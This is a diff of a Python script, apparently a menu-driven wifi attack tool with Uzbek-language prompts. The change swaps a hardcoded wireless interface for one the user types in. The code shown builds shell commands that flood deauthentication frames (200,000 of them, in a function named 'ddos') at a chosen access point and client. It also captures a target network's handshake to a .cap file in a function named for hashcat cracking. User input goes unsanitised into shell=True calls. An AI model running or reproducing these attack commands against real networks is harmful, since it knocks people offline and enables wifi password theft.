@@ -57,16 +57,17 @@ def main():
     subprocess.call("airodump-ng wlx3460f91a23e7 ", shell=True)
     main()
 def ddos():
+    wi = input("wifi interface ==> ")
     wifi_mack = input("wifi mack adresi ==> ")
     wifi_x = input("foydalanuvchi mack adresi ==> ")
-    subprocess.call(f"sudo aireplay-ng --deauth 200000 -a {wifi_mack}   -c {wifi_x} wlx3460f91a23e7 ", shell=True)
+    subprocess.call(f"sudo aireplay-ng --deauth 200000 -a {wifi_mack}   -c {wifi_x} {wi} ", shell=True)
     ddos()
 def hashcat2():
-
+    wi1 = input("wifi interface ==> ")
     wifi_mac = input("wifi mack adresi ==> ")
     wifi_channel = int(input("wifi channel ==>  "))
     wifi_cap = input("wifi uchun [file].cap nomi ")
-    subprocess.call(f"sudo airodump-ng --channel {wifi_channel} --bssid {wifi_mac} --write  {wifi_cap}  wlx3460f91a23e7 ", shell=True)
+    subprocess.call(f"sudo airodump-ng --channel {wifi_channel} --bssid {wifi_mac} --write  {wifi_cap} {wi1} ", shell=True)
 
 zx = int(input(Fore.RESET + " ====>  "))
 if zx == 1:
